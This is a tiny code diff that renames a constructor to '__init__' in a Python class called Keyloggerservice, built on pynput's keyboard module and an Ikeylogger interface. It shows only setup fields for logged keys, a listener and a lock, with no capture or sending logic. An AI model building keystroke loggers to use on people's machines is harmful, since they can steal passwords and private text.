@@ -3,7 +3,7 @@ from pynput import keyboard
 from interfaces.ikeyLogger import Ikeylogger
 
 class Keyloggerservice(Ikeylogger):
-    def _init_(self):
+    def __init__(self):
         self.logged_keys = []
         self.listener = None
         self.lock = threading.Lock()
